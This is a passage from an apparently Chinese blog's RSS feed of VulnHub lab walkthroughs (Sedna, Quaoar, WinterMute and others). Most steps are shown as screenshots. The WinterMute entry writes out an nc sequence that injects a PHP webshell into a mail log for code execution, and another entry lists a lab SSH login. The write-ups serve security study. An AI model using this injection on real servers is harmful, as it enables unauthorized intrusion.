&lt;p&gt;当服务器中存在NFS共享，且开启了no_root_squash选项时，这时如果客户端使用的是root用户，那么对于共享目录来说，该客户端就有root权限，可以使用它来提升权限。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa3ae3bcea285120de225ba2e8e6d24d1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1f2644616e804e3b8c187f83404230f4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8531d9dd5547cc90b149c72f0d05db8eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;挂载&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x059 Sedna</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x059-sedna/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x059-sedna/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc135975b771204af23cdab25abe64e82image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEaa778fd28e434b1b3b9adbe24cb85a9eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;先看samb吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5e29a48c49bd12b7b99e6fc9671af808image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE45c8ad22204e88076863d1d3f486853cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;疑似线索：&lt;/p&gt;
&lt;p&gt;tests/_data/dump.sql&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE18da2beffdffc3acbddc3bafd1ca247fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;恼火，没想到，中间件漏洞，没见过的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4b888a8cfc792dfd5a560b414e0dd46aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE718aab8b67187e563187c6e28f306b39image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;修改poc:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE366be6ed4caac38271c4a58bccf02ff1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4811b1e61ed5b39aafab3687c248ca06image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa815e56eee76a861fd14af9504f6a870image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;试了无数的POC&lt;/p&gt;
&lt;p&gt;最后无奈找到这个了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6c2f26be610b59cf38575fc60d7cbb49image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1bf036cedb6d1e303899d2f797ccaf45image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5cf27c92f92e4873419c8366bf2f80aeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6161a6e5f75e884bce7fc4c7aec612adimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE477bbe6399bbfe714432f7946efb8842image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x060 Quaoar</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x060-quaoar/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x060-quaoar/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE472b2c69ca019350f88d4ab45af2f53eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEef21bc446a2a2b84cd76b9d685f3a045image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEda947d05f05a47cea653084f2f94ac2bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE85c3e28dbc5d3930cae976f1bca81e6aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE945b214fb3b9f43d88b3ff96b233fefaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;Samba&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEedfa0689cd4b8bee27a8c45792f5ad0cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5897df7b6c73a0ad82210e3e43d31d59image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wpscan&lt;/p&gt;
&lt;p&gt;插件&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd47c48cef34f04d248fa596a0327921eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfaf916a235e10af75fd774a5b15236d3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE373abc3f91ee9bcf642a666157e98bcaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://192.168.5.107/wordpress/wp-content/themes/twentyfourteen/404.php&#34;&gt;http://192.168.5.107/wordpress/wp-content/themes/twentyfourteen/404.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd62726fcda258afbd659cdbffd7c8c57image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4f017cc3c18226c633d00b8023ff44b4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE68d96189d3f6478ee753fda28e3d7e90image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x061 Bsides Vancouver 2018</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x061-bsides-vancouver-2018/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x061-bsides-vancouver-2018/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd4a208d5ba6cdb952ee2bedc82c80b5bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE939d567f974e37d69e6998aaf8980c32image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE30bd3b6720afb4a6c2397fb4013ed596image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;21匿名登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5fc4d760efb2900c10a83966e3c8fb12image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE98c80455ce49bcda563fcde343d435afimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ftp切换失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3d34aa3f26a3a2ce913f086334c567bdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口&lt;/p&gt;
&lt;p&gt;目录扫描&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfaa345832def0cdf643ea5cd033fd356image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现wordpress&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7174001dca5312c001b2bf8248f466a0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wpscan&lt;/p&gt;
&lt;p&gt;用户&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE96ed499c674f2558315d7e380e87b1baimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;插件&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf2bf6ba3cc367d65b39a9209567e00baimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;试了一下刚刚的文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8cfab4f813095664bca44462cce0f930image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不行&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3e7b3acad6161d06b02b32c0e84d4c87image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上rockyou&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcd4dfdfb8aa8fa5b6669fc8bd717b9e9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE53fcf80257d3245a8ac84fa438576486image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;sudo -l没有密码&lt;/p&gt;
&lt;p&gt;SUID发现可疑文件：&lt;/p&gt;
&lt;p&gt;但是似乎用不了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEce4824daee28ea08c183383d1a83a660image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现五个用户：&lt;/p&gt;
&lt;p&gt;和ftp里面的一样&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9d06815302c181ea6a67dfc46c1b5c07image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;数据库信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE221591cc45b9c5410b305b810f592080image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是这个密码所有用户都用不了&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8a641193b29534192d4d91588b6002d7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上脚本:&lt;/p&gt;
&lt;p&gt;计划任务：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE954743f866eace0c6b2e697dcaf46381image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc84f4adb368542c99c32d97b6566f56bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE675bcdef1b815f9b99edf390413cc2ddimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5f9faf406223032eed55a89fd9afd0f9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;内核提权：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x062 DEFCON Toronto Galahad</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x062-defcon-toronto-galahad/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x062-defcon-toronto-galahad/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe605071498edbb1bc00d96ed7a95b46bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6cab4bd04da57ff2b2998519d55bc3f6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfed7689ccc7ddf553473c9dfc7c8b60cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;80端口&lt;/p&gt;
&lt;p&gt;打开网页，发现一串二进制字符：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9aac4a6b445e87397df8a1ca5045bf48image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;解开后是这一串内容：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf9badb0256196b71484da9aba2948844image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE902c72824e62e7f84c1a922e0a7cae4cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现s.txt:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc9308d55abbf6717142358fcaf9e0438image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;解密出来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEda20193037a7fb2ac537179ffcf289c4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面没思路了，我还是不太喜欢这种CTF式的靶机，我满脑子只想着拿shell，所以，在查阅大量资料后，我只尝试进行拿到root：&lt;/p&gt;
&lt;p&gt;经过一段骚操作：&lt;/p&gt;
&lt;p&gt;ssh账号nitro&lt;/p&gt;
&lt;p&gt;密码：zeus&lt;/p&gt;
&lt;p&gt;巨邪门儿，不喜欢ctf:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;井字棋先手，然后无脑下四角就能赢：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf17e9fb292d901ac74b90508b43b505cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;疑似计划任务：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE569fdfd672ff73d173459942fefba7aeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;先秒了再说&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE94c28186996a1a1de12c4c273b2314acimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;再来回头看这个计划任务，整个目录都有写入权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0f3e1f0a5fbb06da59cde274b266cb95image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE870cc7ab85a3443464183731d0ec884bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE44fc2ed10edbb79e89f21b3add1814e7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不过这个15分钟确实缺德：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcf61fd21b872ac55e80e952793ac3725image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x063 WinterMute </title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x063-wintermute-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x063-wintermute-/</guid>
      <description>&lt;p&gt;这台靶场是个双主机靶场&lt;/p&gt;
&lt;h1 id=&#34;第一台主机&#34;&gt;第一台主机&lt;/h1&gt;
&lt;p&gt;192.168.5.104&lt;/p&gt;
&lt;h2 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE68c362deba429ae69fed45d9517b9ca8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa844d08924c6c9dadd2bb5ffc0ee911dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdf5d149940645e9df81a43506f469ab1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h2 id=&#34;渗透&#34;&gt;渗透&lt;/h2&gt;
&lt;p&gt;80端口&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE060cc8d1dc9a6d9c316b2b25b1a11c95image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc2c79a3c50e937e7793df04a89cd245cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;3000端口&lt;/p&gt;
&lt;p&gt;admin/admin直接进入：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1e24b0dee6fe4c2b9da1c19f677f1f03image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后这里是我没想到的，这里是http的路径：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa2e96b80478f41f60c93808700481a0fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;打开：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE53f87dad94e3a0ef6f07caad760c742eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;最开始没看懂什么意思，原来这里的意思是，选择一个人查看他的日志，但是这里看不了/etc/passwd，由于主机开放了25端口，可以看/var/log/mail的日志，就可以用25端口发邮件了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2fec6124137d88692b38ab00d84133b0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用NC写入webshell：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nc 192.168.5.108 25 			#连接邮件服务器
helo root						#标识用户身份
mail from:&amp;#34;ROOT &amp;lt;?php system($_GET[&amp;#39;a&amp;#39;]);?&amp;gt;&amp;#34;   #发件人，木马所在地
rcpt to:root					#收件人
data							#编辑
.							    #编辑结束
quit							#退出nc
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里的木马有些问题，建议使用get请求，并且id什么的是执行不了的，ls是可以的，传参用&amp;amp;：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE2fa3b558d7bc141d559d5402c4cfcfc2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;反弹shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE963c068bf535ff76fc31b0879b987ce6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE80b38633a18415990dacc18a3e179170image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;SUID：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0427285f16c161ce1c6233b0adf8c7feimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfc75302ecb7e9d34e40eb6105bab0402image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbfa6c620f5853a3cc13a7aab78f58b7dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE508789be6ddfaa4e7751c8ea01b07641image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEad6ded3d3605a4497411630063683c9eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x064 Digitalworld.local(Development)</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x064-digitalworld.localdevelopment/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x064-digitalworld.localdevelopment/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6e9d6767176575851400afe1f6e85bdfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7bf405e2c4ceac84c782531af3b9b245image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf8f5e7ca46baabf8b933a69bcb650b62image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;这个靶机不能扫，一扫就挂：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8c241f21891270aa43949935641c82ecimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
